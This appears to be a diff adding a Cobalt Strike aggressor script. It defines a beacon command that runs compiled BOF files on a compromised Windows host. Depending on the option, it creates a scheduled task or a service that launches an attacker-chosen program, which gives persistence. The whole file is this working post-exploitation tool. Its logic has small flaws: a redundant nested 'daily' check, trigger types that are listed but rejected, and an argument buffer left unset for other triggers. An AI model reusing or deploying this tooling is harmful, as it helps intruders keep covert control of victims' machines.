@@ -1,0 +1,70 @@
+# Author: (Dawid Wordliczek)WolfMan12333
+	
+alias csadt {
+	$choice = $2;
+	$bid = $1;
+	$barch = barch($1);
+
+	# Task Scheduler
+    if ($choice eq "ts") {
+		
+		$taskName = $3;
+		$programPath = $4;
+		$triggerType = $5; 
+		$optionalArg1 = $6;
+
+		# Verify user input
+		if ($taskName eq "") {
+			berror($bid, "Please specify a name for the new scheduled task.\n");
+			return;
+		}
+	
+		if ($programPath eq "") {
+			berror($bid, "Please specify the path to the program that you want to run\n");
+			return;
+		}
+	
+		if ($triggerType eq "daily") {
+			if ($triggerType eq "daily") {
+				if ($optionalArg1 eq "") {
+					berror($bid, "Please specify the start time of the task in the following format: 2023-03-24T12:08:00.\n");
+					return;
+				}
+			}
+		}
+		else {
+			berror($bid, "This trigger option is not supported. Please select one of the following options: onetime | daily | logon | startup | lock | unlock\n");
+			return;
+		}
+	
+		# Read in the right BOF file
+		$handle = openf(script_resource("addtaskscheduler. $+ $barch $+ .o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+
+		if ($triggerType eq "daily") {
+			$arg_data  = bof_pack($bid, "zZZzZ", $choice, $taskName, $programPath, $triggerType, $optionalArg1);
+		}
+		# Service Creation
+	} else if ($choice eq "cs"){
+		local('$handle $data $args $servicename $displayname $binarypathname $arch');
+
+		#Create Service variables
+		$servicename = $3;
+		$displayname = $4;
+		$binarypathname = $5;
+
+		# read in our BOF file
+		$arch = barch($1);
+		$handle = openf(script_resource("csb. $+ $barch $+ .o"));
+		$data = readb($handle, -1);
+		closef($handle);
+
+		$arg_data = bof_pack($bid, "zzzz", $choice, $servicename, $displayname, $binarypathname);
+	} else {
+		println("This choice is not possible!!! Try ts or cs!!!");
+		return;
+	}
+	
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
